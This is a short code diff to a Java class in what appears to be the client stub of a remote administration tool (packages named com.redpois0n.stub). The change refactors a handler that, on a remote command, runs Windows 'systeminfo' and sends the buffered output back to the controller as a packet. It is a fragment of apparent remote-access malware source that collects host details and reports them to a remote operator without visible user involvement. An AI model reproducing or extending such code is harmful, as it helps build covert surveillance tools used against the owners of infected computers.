@@ -5,6 +5,7 @@ import java.io.InputStreamReader;
 
 import com.redpois0n.Connection;
 import com.redpois0n.common.OperatingSystem;
+import com.redpois0n.stub.packets.outgoing.Packet57RawComputerInfo;
 
 
 public class PacketSYSINFO extends AbstractIncomingPacket {
@@ -14,16 +15,15 @@ public class PacketSYSINFO extends AbstractIncomingPacket {
 		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
 			Process p = Runtime.getRuntime().exec("systeminfo");
 			BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
-
-			Connection.writeLine("RAWINFO");
 			
+			String info = "";
 			String line;
 
 			while ((line = reader.readLine()) != null) {
-				Connection.writeLine(line.trim());
+				info += line + "\n";
 			}
-
-			Connection.writeLine("END");
+			
+			Connection.addToSendQueue(new Packet57RawComputerInfo(info));
 		}
 	}
 
